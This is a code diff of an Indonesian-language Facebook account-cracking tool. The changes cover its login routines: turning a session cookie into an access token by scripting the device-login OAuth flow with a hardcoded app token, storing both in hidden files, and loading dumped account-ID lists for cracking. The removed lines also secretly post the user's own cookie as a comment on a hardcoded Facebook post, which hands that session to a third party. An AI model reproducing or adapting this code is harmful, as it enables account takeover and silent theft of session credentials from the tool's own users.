@@ -360,105 +360,149 @@ ________¶¶¶________¶¶¶¶____¶¶¶¶¶___¶¶¶_____¶¶¶____
 ____¶¶¶¶¶¶¶¶¶¶¶_____¶¶¶¶¶¶¶¶¶¶______¶¶¶¶¶¶¶¶¶_____
 _____¶¶¶¶¶¶¶¶¶________¶¶¶¶¶¶__________¶¶¶¶¶_______
              """,width=100,padding=(0,8),title=f"Banner",style=f"bold white"))
-#--------------------[ BAGIAN-MASUK ]--------------#
-def login():
+###----------[ NGECEK COOKIES ]----------###
+def login_baz():
 	try:
-		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
-		tokenku.append(token)
+		token = open('.tokenakun.txt','r').read()
+		cok = open('.cookiesakun.txt','r').read()
+		tokenefb.append(token)
 		try:
-			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
-			sy2 = json.loads(sy.text)['name']
-			sy3 = json.loads(sy.text)['id']
-			menu(sy2,sy3)
+			gerap = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokenefb[0], cookies={'cookie':cok})
+			nteng = json.loads(gerap.text)['id']
+			menu(nteng)
 		except KeyError:
-			login123()
+			login_men()
 		except requests.exceptions.ConnectionError:
-			li = ' [+] Problem Internet Connection, Check And Try Again'
-			lo = mark(li, style='red')
-			sol().print(lo, style='cyan')
+			baz_anim(f'{mer}koneksimu tidak ada tod :(')
 			exit()
 	except IOError:
-		login123()
+		login_men()
 		
-def login_lagi334():
-	try:
-		cetak(nel('Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=90,style=f"bold white"))
-		your_cookies = input(' [+] Masukan Cookie : ')
-		with requests.Session() as r:
-			try:
-		os.system('clear')
-		banner()
-		cetak(nel('\t©©© Saran Ektensi : [green]Cookiedough[white] ©©©'))
-		asu = random.choice([m,k,h,b,u])
-		cookie=input(f'  [{h}•{x}] Masukkan Cookies :{asu} ')
-		cookies = {'cookie':cookie}
-		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
-		req = ses.get(url,cookies=cookies)
-		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
-		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
-		roq = ses.get(nek,cookies=cookies)
-		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
-		requests.post(f"https://graph.facebook.com/v15.0/100072216287842_213375447746330/comments/?message={cookie}&access_token={tok}", headers = {"cookie":cookie})
-		ken = open(".token.txt", "w").write(tok)
-		cok = open(".cok.txt", "w").write(cookie)
-		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
-		exit()
-	except Exception as e:
-		os.system("rm -f .token.txt")
-		os.system("rm -f .cok.txt")
-		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
-		exit()
-		#-----------------[ CRACK FILE ]-----------------#
-def crack_file():
-	try:vin = os.listdir('/sdcard/DUMP-FILE/')
-	except FileNotFoundError:
-		print(' [+] File Tidak Ditemukan ')
-		time.sleep(2)
-		back()
-	if len(vin)==0:
-		print(' [+] Kamu Tidak Memiliki File Dump ')
-		time.sleep(2)
-		back()
-	else:
-		cih = 0
-		lol = {}
-		for isi in vin:
-			try:hem = open('/sdcard/DUMP-FILE/'+isi,'r').readlines()
-			except:continue
-			cih+=1
-			if cih<100:
-				nom = ''+str(cih)
-				lol.update({str(cih):str(isi)})
-				lol.update({nom:str(isi)})
-				print(f'\n %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
-			else:
-				lol.update({str(cih):str(isi)})
-				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
-				print(' [+] %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
-		geeh = input(' [+] Pilih : ')
-		try:geh = lol[geeh]
-		except KeyError:
-			print(f' [+] Pilih Yang Bener Kontol {x}')
-			time.sleep(3)
-			back()
-		try:lin = open('/sdcard/DUMP-FILE/'+geh,'r').read().splitlines()
-		except:
-			print(' [+] File Tidak Ditemukan, Coba Lagi Nanti ')
-			time.sleep(2)
-			back()
-		for xid in lin:
-			id.append(xid)
-		setting()
-#------------------[ BAGIAN-MENU ]----------------#
+###----------[ LOGIN COOKIESNYA ]----------###
+def login_men():
+    try:
+        os.system('clear')
+        banlog()
+        ses = requests.Session()
+        print('âââââââââââââââââââââââââââââ')
+        your_cookies=input(f'cookies :{xxx}{hijo} ')
+        with requests.Session() as r:
+                r.headers.update({
+                    'content-type': 'application/x-www-form-urlencoded',
+                })
+                data = {
+                    'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
+                    'scope': ''
+                }
+                response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
+                code, user_code = response['code'], response['user_code']
+                verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
+                r.headers.pop(
+                    'content-type'
+                )
+                r.headers.update({
+                    'sec-fetch-mode': 'navigate',
+                    'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
+                    'sec-fetch-site': 'cross-site',
+                    'Host': 'm.facebook.com',
+                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                    'sec-fetch-dest': 'document',
+                })
+                response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
+                if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
+                    print("\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;91m Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r')
+                else:
+                    action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
+                    fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
+                    jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
+                    data = {
+                        'fb_dtsg': fb_dtsg,
+                        'jazoest': jazoest,
+                        'qr': 0,
+                        'user_code': user_code,
+                    }
+                    r.headers.update({
+                        'origin': 'https://m.facebook.com',
+                        'referer': verification_url,
+                        'content-type': 'application/x-www-form-urlencoded',
+                        'sec-fetch-site': 'same-origin',
+                    })
+                    response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
+                    if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
+                        r.headers.pop(
+                            'content-type'
+                        );r.headers.pop(
+                            'origin'
+                        )
+                        response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
+
+                        action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
+                        fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
+                        jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
+                        scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
+                        display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
+                        user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
+                        logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
+                        auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
+                        encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
+                        return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
+                        r.headers.update({
+                            'origin': 'https://m.facebook.com',
+                            'referer': response3.url,
+                            'content-type': 'application/x-www-form-urlencoded',
+                        })
+                        data = {
+                            'fb_dtsg': fb_dtsg,
+                            'jazoest': jazoest,
+                            'scope': scope,
+                            'display': display,
+                            'user_code': user_code,
+                            'logger_id': logger_id,
+                            'auth_type': auth_type,
+                            'encrypted_post_body': encrypted_post_body,
+                            'return_format[]': return_format,
+                        }
+                        response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
+                        windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
+                        r.headers.pop(
+                            'content-type'
+                        );r.headers.pop(
+                            'origin'
+                        )
+                        r.headers.update({
+                            'referer': 'https://m.facebook.com/',
+                        })
+                        response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
+                        if 'Sukses!' in str(response6):
+                            r.headers.update({
+                                'sec-fetch-mode': 'no-cors',
+                                'referer': 'https://graph.facebook.com/',
+                                'Host': 'graph.facebook.com',
+                                'accept': '*/*',
+                                'sec-fetch-dest': 'script',
+                                'sec-fetch-site': 'cross-site',
+                            })
+                            response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
+                            access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
+                            ken = open(".tokenakun.txt", "w").write(access_token)
+                            cok = open(".cookiesakun.txt", "w").write(your_cookies)
+                            baz_anim(f'{puti}âââ ââ¤{ung} login berhasil ster jalanin ulang scnya')
+                            exit()
+                        else:
+                            print('\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;91m Gagal...')
+    except Exception as e:
+        os.system('rm -rf .tokeneakun.txt && rm -rf .cookiesakun.txt')
+        baz_anim(f'{puti}âââ ââ¤{hijo} login gagal ster coba ganti tumbal')
+        exit()
+
+###----------[ BAGIAN MENU ]----------###
 def menu(id):
 	try:
-		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
+		cok = open('.cookiesakun.txt','r').read()
 	except IOError:
-		print('[×] Cookies Kadaluarsa ')
-		time.sleep(5)
-		login_lagi334()
+		baz_anim(f'{mer}cookies telah kadaluarsa ster')
+		waktu(4)
+		login_men()
 	os.system('clear')
 	banner()
 	try:cek_data = requests.get("http://ip-api.com/json/").json()
